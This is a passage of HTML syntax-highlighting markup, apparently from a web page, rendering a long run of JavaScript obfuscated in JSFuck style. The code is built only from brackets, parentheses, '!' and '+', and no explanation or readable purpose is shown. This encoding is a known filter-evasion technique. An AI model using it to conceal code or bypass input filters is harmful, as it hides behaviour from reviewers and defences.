operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span 